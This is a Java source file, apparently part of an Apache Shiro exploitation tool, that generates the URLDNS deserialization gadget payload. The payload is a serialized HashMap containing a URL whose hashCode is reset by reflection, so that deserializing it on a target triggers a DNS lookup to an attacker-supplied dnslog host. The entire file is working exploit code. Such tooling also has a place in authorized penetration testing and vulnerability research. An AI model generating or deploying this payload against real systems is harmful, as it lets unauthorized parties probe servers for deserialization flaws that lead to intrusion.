package com.y5neko.shiroexp.gadget;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS {
    public static byte[] genPayload(String dnslogURL) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException {

        // 通过实例化URLStreamHandler子类自定义handler，从而实现重写
        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) {
                return null;
            }
            @Override
            protected synchronized InetAddress getHostAddress(URL u){
                return null;
            }
        };

        Class<?> clazz = Class.forName("java.net.URL");
        Constructor<?> constructor = clazz.getConstructor(URL.class, String.class, URLStreamHandler.class);
        Object url = constructor.newInstance(null, dnslogURL, handler);
        // 反射获取hashCode属性修改权限
        Field hashCode = clazz.getDeclaredField("hashCode");
        hashCode.setAccessible(true);

        HashMap<Object, Integer> hashMap = new HashMap<>();
        hashMap.put(url, 1);
        hashCode.set(url, -1);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.close();
        return baos.toByteArray();
    }
}
